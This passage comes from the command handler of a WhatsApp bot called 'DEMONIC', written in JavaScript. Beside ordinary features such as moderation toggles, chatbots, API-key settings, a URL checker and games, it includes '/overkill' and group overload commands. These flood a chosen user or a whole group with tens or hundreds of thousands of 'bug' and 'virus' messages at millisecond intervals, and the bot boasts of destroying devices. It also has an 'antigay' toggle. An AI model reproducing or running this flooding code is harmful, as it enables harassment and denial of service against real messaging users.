                  text: `💥💥💥 *GROUP ANNIHILATION COMPLETE* 💥💥💥\n\n⚙️⚙️⚙️ DESTRUCTION REPORT:\n├─ Total Messages Sent: ${GROUP_OVERLOAD_COUNT}\n├─ WhatsApp Status: COMPLETELY DESTROYED\n├─ Group Status: PERMANENTLY OFFLINE\n├─ All Members: FORCED OFFLINE\n├─ Sent In: ${Math.round((Date.now() - BUG_STORE[from].startTime) / 1000)}s\n├─ Recovery: IMPOSSIBLE\n└─ RESULT: TOTAL VICTORY ✨\n\n💀 THE ENTIRE GROUP HAS BEEN NUKED! 💀`
                });
              }
              return;
            }

            let msg;
            const randomType = Math.random();

            if (randomType < 0.2) {
              msg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
            } else if (randomType < 0.4) {
              msg = DEADLY_MESSAGES[Math.floor(Math.random() * DEADLY_MESSAGES.length)];
            } else if (randomType < 0.6) {
              msg = OVERDEADLY_MESSAGES[Math.floor(Math.random() * OVERDEADLY_MESSAGES.length)];
            } else if (randomType < 0.8) {
              msg = OVERLOAD_MESSAGES[Math.floor(Math.random() * OVERLOAD_MESSAGES.length)];
            } else {
              msg = VIRUS_MESSAGES[Math.floor(Math.random() * VIRUS_MESSAGES.length)];
            }

            try {
              await sock.sendMessage(from, { text: msg });
              BUG_STORE[from].sent++;
            } catch (err) {
              // Ignore errors - maximum output at all times
            }
          }, 1);
        }

        if ((cmd === "/overkill" || cmd.startsWith("/overkill ")) && isOwner(sender)) {
          const args = body.slice(9).trim().split(" ");
          let user = parseTarget(body, m);

          let count = 50000;
          const lastArg = args[args.length - 1];
          if (lastArg && /^\d+$/.test(lastArg) && lastArg.length <= 6) {
            count = parseInt(lastArg) || 50000;
          }

          if (!user) {
            user = from;
          }


          if (user !== from || !isGroup) {

            if (user !== from && ANTIBUG[user]) {
              return sock.sendMessage(from, { text: `🛡️ ❌ Cannot bug @${user.split("@")[0]} - They are PROTECTED by ANTIBUG!`, mentions: [user] });
            }

            if (BUG_STORE[user] && BUG_STORE[user].rate === "OVERKILL") {
              return sock.sendMessage(from, { text: `⚠️ Already in OVERKILL MODE!` });
            }

            BUG_STORE[user] = { count, sent: 0, startTime: Date.now(), rate: "OVERKILL" };

            const targetName = user === from ? (isGroup ? "GROUP" : "CHAT") : `@${user.split("@")[0]}`;
            const mentionArray = user === from ? [] : [user];

            await sock.sendMessage(from, {
              text: `💯 *OVERKILL SYSTEM INITIALIZED* 💯\n\n🚀🚀🚀 REALITY WARPING ATTACK:\n├─ Target: ${targetName}\n├─ Payload: ${count} MEGA MESSAGES\n├─ Speed: 50K+ msgs/sec 🚀\n├─ Dimension: COLLAPSING\n├─ Singularity: FORMING\n├─ Status: TRANSCENDING REALITY\n└─ WARNING: CANNOT BE STOPPED\n\n💯 *UNLEASHING QUANTUM DESTRUCTION* 💯`,
              mentions: mentionArray
            });

            const overkillInterval = setInterval(async () => {
              if (!BUG_STORE[user] || BUG_STORE[user].sent >= count) {
                clearInterval(overkillInterval);
                if (BUG_STORE[user]) {
                  delete BUG_STORE[user];
                  await sock.sendMessage(from, {
                    text: `💯 *OVERKILL SYSTEM COMPLETE* 💯\n\n🚀🚀🚀 ULTIMATE DESTRUCTION REPORT:\n├─ Total Quantum Messages: ${count}\n├─ Target: @${user.split("@")[0]}\n├─ Reality Status: PERMANENTLY WARPED 🌌\n├─ Dimensions Destroyed: INFINITE\n├─ Device Status: ERASED FROM EXISTENCE\n├─ Messages Sent In: ${Math.round((Date.now() - BUG_STORE[user].startTime) / 1000)}s\n├─ Speed: 50K+ msgs/sec\n├─ Recovery: IMPOSSIBLE (LAWS OF PHYSICS BROKEN)\n└─ RESULT: COMPLETE TRANSCENDENCE ✨\n\n💯 NOTHING LEFT TO DESTROY 💯`,
                    mentions: [user]
                  });
                }
                return;
              }

              let msg;
              const randomType = Math.random();

              if (randomType < 0.17) {
                msg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
              } else if (randomType < 0.33) {
                msg = DEADLY_MESSAGES[Math.floor(Math.random() * DEADLY_MESSAGES.length)];
              } else if (randomType < 0.5) {
                msg = OVERDEADLY_MESSAGES[Math.floor(Math.random() * OVERDEADLY_MESSAGES.length)];
              } else if (randomType < 0.67) {
                msg = OVERLOAD_MESSAGES[Math.floor(Math.random() * OVERLOAD_MESSAGES.length)];
              } else if (randomType < 0.83) {
                msg = VIRUS_MESSAGES[Math.floor(Math.random() * VIRUS_MESSAGES.length)];
              } else {
                msg = OVERKILL_MESSAGES[Math.floor(Math.random() * OVERKILL_MESSAGES.length)];
              }

              try {
                await sock.sendMessage(user, { text: msg });
                BUG_STORE[user].sent++;
              } catch (err) { }
            }, 1);
            return;
          }


          if (!isGroup) {
            return sock.sendMessage(from, { text: "❌ This only works in groups! Mention a user for DM overkill" });
          }

          if (BUG_STORE[from] && BUG_STORE[from].rate === "OVERKILL-GROUP") {
            return sock.sendMessage(from, { text: "⚠️ This group is already in OVERKILL MODE!" });
          }

          const GROUP_OVERKILL_COUNT = 200000;
          BUG_STORE[from] = { count: GROUP_OVERKILL_COUNT, sent: 0, startTime: Date.now(), rate: "OVERKILL-GROUP" };

          await sock.sendMessage(from, {
            text: `💯💯💯 *GROUP OVERKILL ACTIVATED* 💯💯💯\n\n🚀🚀🚀 REALITY WARPING ATTACK:\n├─ Payload: ${GROUP_OVERKILL_COUNT} MEGA MESSAGES\n├─ Speed: 50K+ msgs/sec 🚀\n├─ Scope: ENTIRE GROUP\n├─ Dimension: COLLAPSING\n├─ Status: TRANSCENDING REALITY\n└─ WARNING: CANNOT BE STOPPED`
          });

          const groupOverkillInterval = setInterval(async () => {
            if (!BUG_STORE[from] || BUG_STORE[from].sent >= GROUP_OVERKILL_COUNT) {
              clearInterval(groupOverkillInterval);
              if (BUG_STORE[from]) {
                delete BUG_STORE[from];
                await sock.sendMessage(from, {
                  text: `💯💯💯 *GROUP OVERKILL COMPLETE* 💯💯💯\n\n🚀🚀🚀 ULTIMATE DESTRUCTION REPORT:\n├─ Total Quantum Messages: ${GROUP_OVERKILL_COUNT}\n├─ Reality Status: PERMANENTLY WARPED 🌌\n├─ Dimensions Destroyed: INFINITE\n├─ Group Status: ERASED FROM EXISTENCE\n├─ All Members: TRANSCENDED\n├─ Recovery: IMPOSSIBLE\n└─ RESULT: COMPLETE TRANSCENDENCE ✨`
                });
              }
              return;
            }

            let msg;
            const randomType = Math.random();

            if (randomType < 0.17) {
              msg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
            } else if (randomType < 0.33) {
              msg = DEADLY_MESSAGES[Math.floor(Math.random() * DEADLY_MESSAGES.length)];
            } else if (randomType < 0.5) {
              msg = OVERDEADLY_MESSAGES[Math.floor(Math.random() * OVERDEADLY_MESSAGES.length)];
            } else if (randomType < 0.67) {
              msg = OVERLOAD_MESSAGES[Math.floor(Math.random() * OVERLOAD_MESSAGES.length)];
            } else if (randomType < 0.83) {
              msg = VIRUS_MESSAGES[Math.floor(Math.random() * VIRUS_MESSAGES.length)];
            } else {
              msg = OVERKILL_MESSAGES[Math.floor(Math.random() * OVERKILL_MESSAGES.length)];
            }

            try {
              await sock.sendMessage(from, { text: msg });
              BUG_STORE[from].sent++;
            } catch (err) { }
          }, 1);
        }

        if ((cmd === "/stopbug" || cmd.startsWith("/stopbug ")) && isOwner(sender)) {
          const user = parseTarget(body, m);
          if (!user) {
            return sock.sendMessage(from, { text: "❌ Mention the bugged user or paste their phone number" });
          }

          if (BUG_STORE[user]) {
            const bugData = BUG_STORE[user];
            delete BUG_STORE[user];
            return sock.sendMessage(from, {
              text: `✅ Stopped bugging @${user.split("@")[0]}\n\n📊 Bug Stats:\n├─ Type: ${bugData.rate}-RATE\n├─ Sent: ${bugData.sent}/${bugData.count} messages\n└─ Duration: ${Math.round((Date.now() - bugData.startTime) / 1000)}s`,
              mentions: [user]
            });
          }

          return sock.sendMessage(from, {
            text: `❌ @${user.split("@")[0]} is not being bugged`
          });
        }

        if (cmd === "/bugged") {
          const activeBugs = Object.entries(BUG_STORE).map(
            ([jid, data]) => `@${jid.split("@")[0]} → ${data.sent}/${data.count} (${data.rate}-RATE)`
          );

          if (!activeBugs.length) {
            return sock.sendMessage(from, { text: "✅ No one is being bugged right now" });
          }

          return sock.sendMessage(from, {
            text: `🪲 *ACTIVE BUGS*\n\n${activeBugs.join("\n")}`,
            mentions: Object.keys(BUG_STORE)
          });
        }


        if (cmd === "/myscore") {
          const userScore = SCORE_STORE[sender] || 0;
          return sock.sendMessage(from, {
            text: `⭐ *YOUR SCORE*\n\n🎯 Current Score: ${userScore}\n\n📈 Earn points:\n├─ /joke → +10 pts\n├─ /truth → +15 pts\n├─ /dare → +15 pts\n└─ Other fun commands → +5 pts`
          });
        }

        if (cmd === "/topscores") {
          const scores = Object.entries(SCORE_STORE)
            .sort(([, a], [, b]) => b - a)
            .slice(0, 10)
            .map(([jid, score], index) => `${index + 1}. @${jid.split("@")[0]} → ${score} ⭐`);

          if (!scores.length) {
            return sock.sendMessage(from, {
              text: "📊 No scores yet! Use /joke, /truth, /dare to earn points!"
            });
          }

          return sock.sendMessage(from, {
            text: `🏆 *TOP SCORES*\n\n${scores.join("\n")}`,
            mentions: Object.keys(SCORE_STORE).slice(0, 10)
          });
        }


        if (cmd === "/menu") {

          await sendMenuImage(sock, from, VERSION, PREFIX);


          return sendMenuAudio(sock, from);
        }


        if (cmd === "/self-destruct" && isOwner(sender)) {
          await sock.sendMessage(from, {
            text: `💣 *SELF-DESTRUCT ACTIVATED* 💣\n\n⚠️ DEMONIC bot self-destruction initiated...\n\nDeleting all session files...\n🔴 Going OFFLINE\n🔥 ALL DATA ERASED\n\n👋 Goodbye! master nice meeting you`
          });


          setTimeout(() => {
            try {

              const sessionPath = path.join(__dirname, "session");
              if (fs.existsSync(sessionPath)) {
                fs.rmSync(sessionPath, { recursive: true, force: true });
                console.log("🗑️ Session files deleted from:", sessionPath);
              } else {
                console.log("⚠️ Session folder not found at:", sessionPath);
              }
              console.log("💣 DEMONIC Bot Self-Destructed!");
              process.exit(0);
            } catch (err) {
              console.error("Error during self-destruct:", err);
              process.exit(1);
            }
          }, 3000); // 3 seconds wait
        }


        if (cmd.startsWith("/antibug ") && isOwner(sender)) {
          const args = body.slice(9).trim().split(" ");
          const statusArg = args[args.length - 1].toLowerCase(); // Get last word (on/off)
          const targetText = body.slice(9).trim().replace(/\s+(on|off)$/i, ""); // Remove on/off from end


          let targetJid = null;


          const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
          if (mentioned) {
            targetJid = mentioned;
          } else {

            const phoneMatch = targetText.match(/(\d{10,15})/);
            if (phoneMatch) {
              targetJid = phoneMatch[1] + "@s.whatsapp.net";
            }
          }

          if (!targetJid) {
            return sock.sendMessage(from, { text: "❌ Usage: /antibug @user on  OR  /antibug @user off" });
          }

          const userId = targetJid.split("@")[0];
          const isEnabling = statusArg === "on";

          if (isEnabling) {
            ANTIBUG[targetJid] = true;
            return sock.sendMessage(from, {
              text: `🔒 *ANTIBUG ENABLED* 🔒\n\n✅ @${userId} is now PROTECTED\n🛡️ Cannot receive ANY bug attacks\n💪 Immune to: /overdeadly, /deadly, /overload, /overkill, /highrate-bug, /lowrate-bug`,
              mentions: [targetJid]
            });
          } else {
            if (ANTIBUG[targetJid]) {
              delete ANTIBUG[targetJid];
            }
            return sock.sendMessage(from, {
              text: `🔓 *ANTIBUG DISABLED* 🔓\n\n❌ @${userId} is no longer protected\n🎯 Can now receive bug attacks`,
              mentions: [targetJid]
            });
          }
        }


        if (cmd.startsWith("/profile")) {
          try {
            let targetUser = parseTarget(body, m);

            if (!targetUser) {

              targetUser = sender;
            }


            const profileUrl = await sock.profilePictureUrl(targetUser, "image").catch(() => null);

            if (!profileUrl) {
              return sock.sendMessage(from, {
                text: `❌ Could not fetch profile picture for @${targetUser.split("@")[0]}`,
                mentions: [targetUser]
              });
            }


            const imageResponse = await axios.get(profileUrl, { responseType: "arraybuffer" });

            return sock.sendMessage(from, {
              image: Buffer.from(imageResponse.data, "binary"),
              caption: `👤 Profile Picture of @${targetUser.split("@")[0]}`
            }, { quoted: m });
          } catch (err) {
            console.error("Error fetching profile picture:", err);
            return sock.sendMessage(from, {
              text: `❌   Error fetching profile picture: ${err.message}`
            });
          }
        }


        if (cmd === "/ping" && isOwner(sender)) {
          const ping = Date.now();
          return sock.sendMessage(from, {
            text: `🏓 Pong! (${Date.now() - ping}ms)`
          });
        }

        if (cmd === "/uptime") {
          const uptime = process.uptime();
          const days = Math.floor(uptime / (3600 * 24));
          const hours = Math.floor((uptime % (3600 * 24)) / 3600);
          const minutes = Math.floor((uptime % 3600) / 60);
          const seconds = Math.floor(uptime % 60);

          return sock.sendMessage(from, {
            text: `⏱️ *BOT UPTIME*\n\n${days}d ${hours}h ${minutes}m ${seconds}s\n\nStill running strong! 🦾`
          });
        }

        if (cmd.startsWith("/curl ")) {
          const url = body.slice(6).trim();
          if (!url) {
            return sock.sendMessage(from, { text: "❌ Please provide a URL!\nExample: /curl https://example.com" });
          }

          try {
            const response = await axios.get(url, { timeout: 10000 });
            const status = response.status;
            const contentType = response.headers['content-type'] || 'Unknown';
            const contentLength = response.headers['content-length'] || 'Unknown';

            return sock.sendMessage(from, {
              text: `🌐 *WEBSITE STATUS*\n\n🔗 URL: ${url}\n📊 Status Code: ${status}\n📄 Content-Type: ${contentType}\n📏 Content-Length: ${contentLength}\n\n✅ Website is accessible!`
            });
          } catch (error) {
            const status = error.response?.status || 'Unknown';
            const errorMsg = error.message || 'Unknown error';

            return sock.sendMessage(from, {
              text: `🌐 *WEBSITE STATUS*\n\n🔗 URL: ${url}\n❌ Status: ${status}\n⚠️ Error: ${errorMsg}\n\nWebsite may be down or unreachable.`
            });
          }
        }

        if (cmd.startsWith("/curl2 ")) {
          const url = body.slice(7).trim();
          if (!url) {
            return sock.sendMessage(from, { text: "❌ Please provide a URL!\nExample: /curl2 https://example.com" });
          }

          try {
            // Using VirusTotal public API for phishing check
            const vtResponse = await axios.get(`https://www.virustotal.com/vtapi/v2/url/report?apikey=${VIRUSTOTAL_API_KEY}&resource=${encodeURIComponent(url)}`);

            if (vtResponse.data.response_code === 1) {
              const positives = vtResponse.data.positives;
              const total = vtResponse.data.total;

              if (positives > 0) {
                return sock.sendMessage(from, {
                  text: `🛡️ *PHISHING CHECK*\n\n🔗 URL: ${url}\n🚨 DETECTED AS PHISHING!\n📊 Detections: ${positives}/${total}\n\n⚠️ This URL is flagged as malicious. Do not visit!`
                });
              } else {
                return sock.sendMessage(from, {
                  text: `🛡️ *PHISHING CHECK*\n\n🔗 URL: ${url}\n✅ No phishing detected\n📊 Detections: ${positives}/${total}\n\nURL appears safe, but always be cautious!`
                });
              }
            } else {
              return sock.sendMessage(from, {
                text: `🛡️ *PHISHING CHECK*\n\n🔗 URL: ${url}\n❓ Not found in database\n\nUnable to verify this URL. Use caution!`
              });
            }
          } catch (error) {
            return sock.sendMessage(from, {
              text: `🛡️ *PHISHING CHECK*\n\n🔗 URL: ${url}\n❌ Error checking URL\n\n${error.message}\n\nTry again later or check manually.`
            });
          }
        }

        if (cmd.startsWith("/setprefix ") && isOwner(sender)) {
          const newPrefix = body.slice(11).trim();
          if (!newPrefix || newPrefix.length > 3) {
            return sock.sendMessage(from, {
              text: "❌ Invalid prefix! Use 1-3 characters (e.g., ., /, !, >>)"
            });
          }
          PREFIX = newPrefix;
          return sock.sendMessage(from, {
            text: `✅ Bot prefix changed to: *${PREFIX}*\n\nUse ${PREFIX}menu to see updated commands`
          });
        }

        if (cmd.startsWith("/change-name ") && isOwner(sender)) {
          const newName = body.slice(13).trim();
          if (!newName) {
            return sock.sendMessage(from, {
              text: "❌ Please provide the new  bot name!\n\nUsage: /change-name YourBotName"
            });
          }
          if (newName.length > 50) {
            return sock.sendMessage(from, {
              text: "❌ Bot name too long! Maximum 50 characters allowed."
            });
          }
          global.BOT_NAME = newName;

          const oldBotName = "DEMONIC";
          console.log(`🔄 Bot name changed from ${oldBotName} to ${newName}`);
          return sock.sendMessage(from, {
            text: `✅ Bot name changed to: *${newName}*`
          });
        }

        if (cmd === "/public" && isOwner(sender)) {
          PUBLIC = true;
          return sock.sendMessage(from, {
            text: "✅ Bot is now in PUBLIC mode"
          });
        }

        if (cmd === "/private" && isOwner(sender)) {
          PUBLIC = false;
          return sock.sendMessage(from, {
            text: "🔒 Bot is now in PRIVATE mode"
          });
        }

        if (cmd.startsWith("/creategc") && isOwner(sender)) {
          try {

            const name = body.slice(9).trim() || "DEMONIC-GROUP";


            const g = await sock.groupCreate(name, [sender]);
            const code = await sock.groupInviteCode(g.id);

            await sock.sendMessage(from, {
              text: `✅ *Group Created Successfully!*\n\n📝 Name: ${name}\n👥 Group ID: ${g.id.split("@")[0]}\n🔗 Link: https://chat.whatsapp.com/${code}\n\n💡 Share this link to invite others!`
            });
            return;
          } catch (err) {
            console.error("Error creating group:", err);
            return sock.sendMessage(from, {
              text: `❌ Failed to create group: ${err.message}\n\n💡 Make sure the bot has permission to create groups.`
            });
          }
        }


        if (cmd === "/antilink on" && isGroup)
          return (
            (ANTILINK = true),
            sock.sendMessage(from, { text: "✅ Antilink enabled" })
          );
        if (cmd === "/antilink off" && isGroup)
          return (
            (ANTILINK = false),
            sock.sendMessage(from, { text: "❌ Antilink disabled" })
          );

        if (cmd === "/antisticker on" && isGroup)
          return (
            (ANTISTICKER = true),
            sock.sendMessage(from, { text: "✅ Antisticker enabled" })
          );
        if (cmd === "/antisticker off" && isGroup)
          return (
            (ANTISTICKER = false),
            sock.sendMessage(from, { text: "❌ Antisticker disabled" })
          );

        if (cmd === "/antighost on" && isGroup)
          return (
            (ANTIGHOST = true),
            sock.sendMessage(from, { text: "✅ Antighost enabled" })
          );
        if (cmd === "/antighost off" && isGroup)
          return (
            (ANTIGHOST = false),
            sock.sendMessage(from, { text: "❌ Antighost disabled" })
          );

        if (cmd === "/antichat on" && isGroup)
          return (
            (ANTICHAT = true),
            sock.sendMessage(from, { text: "✅ Antichat enabled" })
          );
        if (cmd === "/antichat off" && isGroup)
          return (
            (ANTICHAT = false),
            sock.sendMessage(from, { text: "❌ Antichat disabled" })
          );

        if (cmd === "/anticall on" && isGroup)
          return (
            (ANTICALL = true),
            sock.sendMessage(from, { text: "✅ Anticall enabled" })
          );
        if (cmd === "/anticall off" && isGroup)
          return (
            (ANTICALL = false),
            sock.sendMessage(from, { text: "❌ Anticall disabled" })
          );

        if (cmd === "/antibadwords on" && isGroup)
          return (
            (ANTIBADWORDS = true),
            sock.sendMessage(from, { text: "✅ Antibadwords enabled - No profanity allowed!" })
          );
        if (cmd === "/antibadwords off" && isGroup)
          return (
            (ANTIBADWORDS = false),
            sock.sendMessage(from, { text: "❌ Antibadwords disabled" })
          );

        if (cmd === "/antigay on" && isGroup)
          return (
            (ANTIGAY = true),
            sock.sendMessage(from, { text: "✅ Antigay enabled" })
          );
        if (cmd === "/antigay off" && isGroup)
          return (
            (ANTIGAY = false),
            sock.sendMessage(from, { text: "❌ Antigay disabled" })
          );

        if (cmd === "/autotyping on")
          return (
            (AUTOTYPING = true),
            sock.sendMessage(from, { text: "✅ Autotyping enabled" })
          );
        if (cmd === "/autotyping off")
          return (
            (AUTOTYPING = false),
            sock.sendMessage(from, { text: "❌ Autotyping disabled" })
          );
        if (cmd === "/autorecording on")
          return (
            (AUTORECORDING = true),
            sock.sendMessage(from, { text: "✅ Autorecording enabled" })
          );
        if (cmd === "/autorecording off")
          return (
            (AUTORECORDING = false),
            sock.sendMessage(from, { text: "❌ Autorecording disabled" })
          );
        if (cmd === "/autorecordtyping on")
          return (
            (AUTOTYPING = true),
            (AUTORECORDING = true),
            sock.sendMessage(from, { text: "✅ Autorecording and autotyping enabled" })
          );
        if (cmd === "/autorecordtyping off")
          return (
            (AUTOTYPING = false),
            (AUTORECORDING = false),
            sock.sendMessage(from, { text: "❌ Autorecording and autotyping disabled" })
          );

        if (cmd === "/autoreact on")
          return (
            (AUTOREACT = true),
            sock.sendMessage(from, { text: "✅ Autoreact enabled" })
          );
        if (cmd === "/autoreact off")
          return (
            (AUTOREACT = false),
            sock.sendMessage(from, { text: "❌ Autoreact disabled" })
          );

        if (cmd.startsWith("/chatbot1")) {
          const args = body.trim().split(/\s+/).slice(1).join(" ");
          if (cmd === "/chatbot1 on") {
            CHATBOT_STATE[from] = "1";
            return sock.sendMessage(from, { text: "✅ Chatbot1 enabled using OpenAI GPT. All messages in this chat will be auto-replied." });
          }
          if (cmd === "/chatbot1 off") {
            delete CHATBOT_STATE[from];
            return sock.sendMessage(from, { text: "❌ Chatbot1 disabled for this chat." });
          }
          if (args) {
            const answer = await getChatbotReply("1", args);
            return sock.sendMessage(from, { text: `🤖 [CHATBOT1] ${answer}` });
          }
          return sock.sendMessage(from, { text: "Usage: /chatbot1 on | /chatbot1 off | /chatbot1 <message>" });
        }

        if (cmd.startsWith("/chatbot2")) {
          const args = body.trim().split(/\s+/).slice(1).join(" ");
          if (cmd === "/chatbot2 on") {
            CHATBOT_STATE[from] = "2";
            return sock.sendMessage(from, { text: "✅ Chatbot2 enabled using OpenAI GPT fallback. All messages in this chat will be auto-replied." });
          }
          if (cmd === "/chatbot2 off") {
            delete CHATBOT_STATE[from];
            return sock.sendMessage(from, { text: "❌ Chatbot2 disabled for this chat." });
          }
          if (args) {
            const answer = await getChatbotReply("2", args);
            return sock.sendMessage(from, { text: `🤖 [CHATBOT2] ${answer}` });
          }
          return sock.sendMessage(from, { text: "Usage: /chatbot2 on | /chatbot2 off | /chatbot2 <message>" });
        }

        if (cmd.startsWith("/chatbot3")) {
          const args = body.trim().split(/\s+/).slice(1).join(" ");
          if (cmd === "/chatbot3 on") {
            CHATBOT_STATE[from] = "3";
            return sock.sendMessage(from, { text: "✅ Chatbot3 enabled using OpenAI GPT fallback. All messages in this chat will be auto-replied." });
          }
          if (cmd === "/chatbot3 off") {
            delete CHATBOT_STATE[from];
            return sock.sendMessage(from, { text: "❌ Chatbot3 disabled for this chat." });
          }
          if (args) {
            const answer = await getChatbotReply("3", args);
            return sock.sendMessage(from, { text: `🤖 [CHATBOT3] ${answer}` });
          }
          return sock.sendMessage(from, { text: "Usage: /chatbot3 on | /chatbot3 off | /chatbot3 <message>" });
        }

        if (cmd === "/chatbot" || cmd.startsWith("/chatbot ")) {
          const args = body.trim().split(/\s+/).slice(1).join(" ");
          if (cmd === "/chatbot on") {
            CHATBOT_STATE[from] = "4";
            return sock.sendMessage(from, { text: "✅ Chatbot enabled using OpenAI GPT Demon Guide. All messages in this chat will be auto-replied." });
          }
          if (cmd === "/chatbot off") {
            delete CHATBOT_STATE[from];
            return sock.sendMessage(from, { text: "❌ Chatbot disabled for this chat." });
          }
          if (args) {
            const answer = await getChatbotReply("4", args);
            return sock.sendMessage(from, { text: `🤖 [CHATBOT4] ${answer}` });
          }
          return sock.sendMessage(from, { text: "Usage: /chatbot on | /chatbot off | /chatbot <message>" });
        }

        if (cmd.startsWith("/chatbot4")) {
          const args = body.trim().split(/\s+/).slice(1).join(" ");
          if (cmd === "/chatbot4 on") {
            CHATBOT_STATE[from] = "4";
            return sock.sendMessage(from, { text: "✅ Chatbot4 enabled using OpenAI GPT Demon Guide. All messages in this chat will be auto-replied." });
          }
          if (cmd === "/chatbot4 off") {
            delete CHATBOT_STATE[from];
            return sock.sendMessage(from, { text: "❌ Chatbot4 disabled for this chat." });
          }
          if (args) {
            const answer = await getChatbotReply("4", args);
            return sock.sendMessage(from, { text: `🤖 [CHATBOT4] ${answer}` });
          }
          return sock.sendMessage(from, { text: "Usage: /chatbot4 on | /chatbot4 off | /chatbot4 <message>" });
        }

        if (cmd.startsWith("/setrapidapi ") && isOwner(sender)) {
          const newKey = body.slice(12).trim();
          if (!newKey) {
            return sock.sendMessage(from, { text: "❌ Usage: /setrapidapi <RapidAPI key>" });
          }
          CONFIG.RAPIDAPI_KEY = newKey;
          try {
            fs.writeFileSync(CONFIG_PATH, JSON.stringify(CONFIG, null, 2));
            RAPIDAPI_KEY = newKey;
            return sock.sendMessage(from, { text: "✅ RapidAPI key saved to config.json. YouTube downloader is ready to use." });
          } catch (error) {
            console.error("Failed to save config.json:", error);
            return sock.sendMessage(from, { text: `❌ Failed to save RapidAPI key: ${error.message}` });
          }
        }

        if (cmd === "/rapidapistatus" && isOwner(sender)) {
          const source = process.env.RAPIDAPI_KEY ? "environment" : CONFIG.RAPIDAPI_KEY ? "config.json" : "none";
          const visible = RAPIDAPI_KEY && RAPIDAPI_KEY !== "YOUR_RAPIDAPI_KEY" ? "✅ configured" : "❌ missing";
          return sock.sendMessage(from, { text: `🔑 RapidAPI Key Status: ${visible}\nSource: ${source}` });
        }

        if (cmd.startsWith("/setopenai ") && isOwner(sender)) {
          const newKey = body.slice(11).trim();
          if (!newKey) {
            return sock.sendMessage(from, { text: "❌ Usage: /setopenai <OpenAI API key>" });
          }
          CONFIG.OPENAI_API_KEY = newKey;
          try {
            fs.writeFileSync(CONFIG_PATH, JSON.stringify(CONFIG, null, 2));
            OPENAI_API_KEY = newKey;
            return sock.sendMessage(from, { text: "✅ OpenAI API key saved to config.json. Chatbot is ready to use." });
          } catch (error) {
            console.error("Failed to save config.json:", error);
            return sock.sendMessage(from, { text: `❌ Failed to save API key: ${error.message}` });
          }
        }

        if (cmd === "/openai status" && isOwner(sender)) {
          const source = process.env.OPENAI_API_KEY ? "environment" : CONFIG.OPENAI_API_KEY ? "config.json" : "none";
          const visible = OPENAI_API_KEY && OPENAI_API_KEY !== "YOUR_OPENAI_API_KEY" ? "✅ configured" : "❌ missing";
          return sock.sendMessage(from, { text: `🧠 OpenAI Key Status: ${visible}\nSource: ${source}` });
        }

        if (cmd.startsWith("/clearopenai") && isOwner(sender)) {
          delete CONFIG.OPENAI_API_KEY;
          try {
            fs.writeFileSync(CONFIG_PATH, JSON.stringify(CONFIG, null, 2));
            OPENAI_API_KEY = process.env.OPENAI_API_KEY || "YOUR_OPENAI_API_KEY";
            return sock.sendMessage(from, { text: "✅ OpenAI API key cleared from config.json." });
          } catch (error) {
            console.error("Failed to save config.json:", error);
            return sock.sendMessage(from, { text: `❌ Failed to clear API key: ${error.message}` });
          }
        }

        if (cmd === "/chatbotstatus") {
          const provider = CHATBOT_STATE[from];
          if (!provider) {
            return sock.sendMessage(from, { text: "🤖 Chatbot is currently disabled for this chat." });
          }
          return sock.sendMessage(from, { text: `🤖 Chatbot active: CHATBOT${provider} (${CHATBOT_LABELS[provider]}).` });
        }

        if (cmd === "/welcome on" && isGroup)
          return (
            (WELCOME = true),
            sock.sendMessage(from, { text: "✅ Welcome enabled" })
          );
        if (cmd === "/welcome off" && isGroup)
          return (
            (WELCOME = false),
            sock.sendMessage(from, { text: "❌ Welcome disabled" })
          );

        if (cmd === "/group-defense on" && isGroup)
          return (
            (GROUP_DEFENSE = true),
            sock.sendMessage(from, { text: "✅ Group Defense enabled.\n\n🛡️ Blocking APKs\n🛡️ Anti-Virus Text\n🛡️ Crash Protection" })
          );
        if (cmd === "/group-defense off" && isGroup)
          return (
            (GROUP_DEFENSE = false),
            sock.sendMessage(from, { text: "❌ Group Defense disabled" })
          );


        if (
          (cmd === "/promote" || cmd.startsWith("/promote ") ||
           cmd === "/demote"  || cmd.startsWith("/demote ")) &&
          isGroup
        ) {
          const user = parseTarget(body, m);
          if (!user)
            return sock.sendMessage(from, {
              text: "❌ Mention a user or provide a number"
            });

          const action = cmd.includes("/promote") ? "promote" : "demote";
          await sock.groupParticipantsUpdate(from, [user], action);

          return sock.sendMessage(from, {
            text: `✅ ${action.charAt(0).toUpperCase() + action.slice(1)} successful`
          });
        }

        if ((cmd === "/kick" || cmd.startsWith("/kick ")) && isGroup) {
          const user = parseTarget(body, m);
          if (!user)
            return sock.sendMessage(from, {
              text: "❌ Mention a user or provide a number"
            });

          try {
            await sock.groupParticipantsUpdate(from, [user], "remove");
            return sock.sendMessage(from, {
              text: `🚫 @${user.split("@")[0]} has been kicked`,
              mentions: [user]
            });
          } catch (err) {
            return sock.sendMessage(from, {
              text: "❌ Failed to kick user (bot needs admin)"
            });
          }
        }






        if (cmd === "/joke") {
          const joke = await getFunJoke();
          SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 10;
          return sock.sendMessage(from, { text: `${joke}\n\n⭐ Your Score: ${SCORE_STORE[sender]}` });
        }
        if (cmd === "/roll")
          return (
            (SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 5),
            sock.sendMessage(from, {
              text: `🎲 ${Math.floor(Math.random() * 6) + 1}\n\n⭐ Your Score: ${SCORE_STORE[sender]}`
            })
          );
        if (cmd.startsWith("/repeat "))
          return (
            (SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 5),
            sock.sendMessage(from, {
              text: body.slice(8) + `\n\n⭐ Your Score: ${SCORE_STORE[sender]}`
            })
          );
        if (cmd.startsWith("/reverse "))
          return (
            (SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 5),
            sock.sendMessage(from, {
              text: body.slice(9).split("").reverse().join("") + `\n\n⭐ Your Score: ${SCORE_STORE[sender]}`
            })
          );
        if (cmd.startsWith("/uppercase "))
          return (
            (SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 5),
            sock.sendMessage(from, {
              text: body.slice(11).toUpperCase() + `\n\n⭐ Your Score: ${SCORE_STORE[sender]}`
            })
          );
        if (cmd.startsWith("/lowercase "))
          return (
            (SCORE_STORE[sender] = (SCORE_STORE[sender] || 0) + 5),
            sock.sendMessage(from, {
              text: body.slice(11).toLowerCase() + `\n\n⭐ Your Score: ${SCORE_STORE[sender]}`
            })
          );
